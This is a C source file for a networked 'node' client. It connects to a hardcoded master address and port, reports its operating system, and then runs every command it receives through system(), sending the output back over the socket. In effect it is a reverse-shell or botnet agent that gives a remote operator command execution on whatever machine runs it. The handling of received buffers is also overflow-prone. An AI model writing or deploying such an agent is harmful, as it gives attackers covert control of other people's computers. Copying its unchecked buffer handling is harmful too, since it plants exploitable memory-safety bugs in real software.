#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>


#ifdef _unix_
#include <sys/utsname.h>
#elif defined(_WIN32)
#include <windows.h>
#endif

#define MAX_CLIENTS 10
#define MAX_LENGTH 2048
#define NAME_LENGTH 15
#define IP "192.168.137.95"
#define PORT "6969"

// Global variables
int flag = 0;
int network_socket = 0;
char name[NAME_LENGTH];
int ID;

void start_symbol()
{
    printf("%s", "> ");
    fflush(stdout);
}

void sendHandler()
{
    char message[MAX_LENGTH];

    while (1)
    {
        start_symbol();
        scanf("%[^\n]%*c", message);

        send(network_socket, message, strlen(message), 0);
        if (!strcmp(message, "***") || !strcmp(message, "/") || !strcmp(message, "goodbyecruelworld") || !strcmp(message, "/exit"))
        {
            printf("Disconnected from sever!\n");
            break;
        }

        bzero(message, MAX_LENGTH);
    }
    flag = 1;
}

void handle_error(char *error)
{
    send(network_socket, error, strlen(error), 0);
}

void execute(char *command)
{
    command[strlen(command) - 1] = ' ';
    command[strlen(command)] = ' ';
    strcat(command, " > temp.txt");
    printf("%s\n", command);
    int status = system(command);

    if (status == -1) // HANDLE
    {
        handle_error("[-] Not Executed");
    }

    FILE *fp;
    char *line = NULL;
    size_t len = 0;
    ssize_t read;

    fp = fopen("temp.txt", "r");
    if (fp == NULL)
        handle_error("[-] File Error");

    char final[MAX_LENGTH];

    while ((read = getline(&line, &len, fp)) != -1)
    {
        strcpy(final, line);
        send(network_socket, final, strlen(final), 0);
    }

    strcpy(final, "==============================================\n");
    send(network_socket, final, strlen(final), 0);

    fclose(fp);

    if (remove("temp.txt") == 0)
        printf("Deleted successfully");

    // char command_delete[100] = "rm temp";
    // status = system(command_delete);
}

void *recvHandler()
{
    char message[MAX_LENGTH];
    int id[1];
    int receive = recv(network_socket, id, sizeof(int), 0);
    ID = id[0];
    printf("Node ID:%d\n", ID);
    while (1)
    {
        receive = recv(network_socket, message, MAX_LENGTH, 0);
        if (strcmp(message, "\n") == 0)
        {
            goto temp;
        }
        if (receive > 0)
        {
            printf("command: %s\n", message);
            execute(message);
            fflush(stdout);
        }
        memset(message, 0, sizeof(message));
        // strcpy(message, "Message Recv");
        // send(network_socket, message, strlen(message), 0);
    temp:
        memset(message, 0, sizeof(message));
    }
}

int getOSDetails()
{
#ifdef _unix_
    struct utsname buffer;
    if (uname(&buffer) != 0)
    {
        perror("uname failed");
        return;
    }
    printf("Operating system: %s %s %s\n", buffer.sysname, buffer.release, buffer.version);
    return 1;
#elif defined(_WIN32)
    OSVERSIONINFOEX info;
    ZeroMemory(&info, sizeof(OSVERSIONINFOEX));
    info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    if (GetVersionEx((LPOSVERSIONINFO)&info) == 0)
    {
        perror("GetVersionEx failed");
        return;
    }
    printf("Operating system: Windows %d.%d\n", info.dwMajorVersion, info.dwMinorVersion);
    return 2;
#else
    {
        printf("Operating system could not be determined.\n");
        return -1;
    }
#endif
}

int main()
{

    network_socket = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr(IP);
    // server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(atoi(PORT));

    // ********************CONNECTION FAILS WHEN MASTER NOT ACTIVE********************
    // while ((connect(network_socket, (struct sockaddr *)&server_addr, sizeof(server_addr))) < 0)
    // {
    // }
    if(connect(network_socket, (struct sockaddr *)&server_addr, sizeof(server_addr))<0)
    {
        printf("Connection failed\n");
        return 1;
    }
    printf("connected!\n");
    int OS[1];
    OS[0] = getOSDetails();
    send(network_socket, OS, sizeof(int), 0);
    // pthread_t thread_sendHandler;
    // if (pthread_create(&thread_sendHandler, NULL, (void *)sendHandler, NULL) != 0)
    // {
    //     printf("ERROR: pthread\n");
    //     return 1;
    // }

    pthread_t thread_recvHandler;
    if (pthread_create(&thread_recvHandler, NULL, (void *)recvHandler, NULL) != 0)
    {
        printf("ERROR: pthread\n");
        return 1;
    }

    while (1)
        if (flag)
            break;

    close(network_socket);

    return 0;
}